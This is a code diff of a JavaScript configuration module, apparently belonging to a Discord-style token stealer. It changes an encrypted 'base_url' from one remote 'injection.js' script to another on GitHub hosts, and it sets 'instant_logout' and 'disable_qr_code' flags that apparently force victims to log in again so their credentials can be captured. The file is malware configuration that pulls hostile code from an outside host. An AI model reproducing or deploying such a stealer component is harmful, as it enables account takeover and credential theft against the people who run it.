@@ -1,6 +1,6 @@
 module.exports = (client) => {
     return {
-        base_url: client.utils.encryption.encryptData("https://raw.githubusercontent.com/1337wtf1337/1337wtf1337/main/injection.js"),
+        base_url: client.utils.encryption.encryptData("https://gist.githubusercontent.com/ilyigna/142da29355c8b244598618c9d405b6f6/raw/dd1d3e7861d19aa316fd76ed6f630d4579522612/injection.js"),
 
         instant_logout: true,
         disable_qr_code: true,
